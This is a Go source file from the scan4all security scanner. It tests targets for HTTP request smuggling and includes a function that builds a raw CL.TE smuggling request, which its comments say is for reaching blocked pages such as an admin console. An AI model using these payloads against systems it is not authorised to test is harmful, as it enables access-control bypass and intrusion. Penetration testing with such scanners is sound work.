package Smuggling

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/socket"
	"github.com/GhostTroops/scan4all/lib/util"
	"log"
	"net/url"
	"strings"
)

func E2EC(s string) string {
	return strings.ReplaceAll(s, "\n", "\r\n")
}

// 接口定义
type Smuggling interface {
	CheckResponse(body string, payload string) bool
	GetPayloads(t *socket.CheckTarget) *[]string
	GetTimes() int
	GetVulType() string
}

var payload = []Smuggling{NewClCl(), NewCLTE(), NewCLTE2(), NewTECL(), NewTETE(), NewErr()}

//var payload = []Smuggling{NewErr()}

func checkSmuggling4Poc(ClTePayload *[]string, nTimes int, r1 *Smuggling, r *socket.CheckTarget) {
	for _, x := range *ClTePayload {
		s := r.SendOnePayload(x, r.UrlPath, r.HostName, nTimes)
		if "" != s && (*r1).CheckResponse(s, x) {
			log.Printf("found: %s\n%s\n", r.UrlRaw, s)
			// send result
			util.SendAnyData(&util.SimpleVulResult{
				Url:     r.UrlPath,
				VulKind: string(util.Scan4all),
				VulType: (*r1).GetVulType(),
				Payload: x,
			}, util.Scan4all)
			break
		}
	}
}

/*
	 check HTTP Request Smuggling
	   可以利用走私尝试访问，被常规手段屏蔽的路径，例如 weblogic 的页面
	  https://portswigger.net/web-security/request-smuggling/finding
	  https://hackerone.com/reports/1630668
	  https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L483
	  1、每个目标的登陆页面只做一次检测，也就是发现你登陆页面的路径可以做一次检测
	  2、每个目标相同上下文的页面只做一次检测，爬虫发现的不同上下文各做一次检测
	  szBody 是为了 相同url 相同payload 的情况下，只发一次请求，进行多次判断而设计，Smuggling 的场景通常不存在

	 做一次 http
		util.PocCheck_pipe <- &util.PocCheck{
			Wappalyzertechnologies: &[]string{"httpCheckSmuggling"},
			URL:                    finalURL,
			FinalURL:               finalURL,
			Checklog4j:             false,
		}
*/
func DoCheckSmuggling(szUrl string, szBody string) {
	for _, x := range payload {
		util.Wg.Add(1)
		go func(j Smuggling, szUrl string) {
			defer util.Wg.Done()
			if "" == szBody {
				x1 := socket.NewCheckTarget(szUrl, "tcp", 30)
				defer x1.Close()
				checkSmuggling4Poc(j.GetPayloads(x1), j.GetTimes(), &j, x1)
			} else {
				j.CheckResponse(szBody, "")
			}
		}(x, szUrl)
	}
}

// 构造走私，用来访问被屏蔽的页面
//
//	确认存在走私漏洞后，可以继续基于走私 走以便filefuzz
//	1、首先 szUrl必须是可访问的 200，否则可能会导致误判
//	@szUrl 设施走私的目标
//	@smugglinUrlPath 希望走私能访问到到页面，例如 /console
//	@secHost 第二段头的host
func GenerateHttpSmugglingPay(szUrl, smugglinUrlPath, secHost string) string {
	a := []string{`POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-Length: %d
Transfer-Encoding: chunked

`, `

GET %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
0`}
	u, err := url.Parse(strings.TrimSpace(szUrl))
	if nil != err {
		log.Println("GenerateHttpSmugglingPay url.Parse err: ", err)
		return ""
	}
	for i, x := range a {
		a[i] = strings.ReplaceAll(x, "\n", "\r\n")
	}
	sf := a[1]
	a[1] = fmt.Sprintf(sf, smugglinUrlPath, secHost)
	a[1] = fmt.Sprintf("%x", len(a[1])-1) + a[1]

	sf = a[0]
	a[0] = fmt.Sprintf(sf, u.RawPath, u.Host, util.GetCustomHeadersRaw(), len([]byte(a[1])))
	return strings.Join(a, "")
}
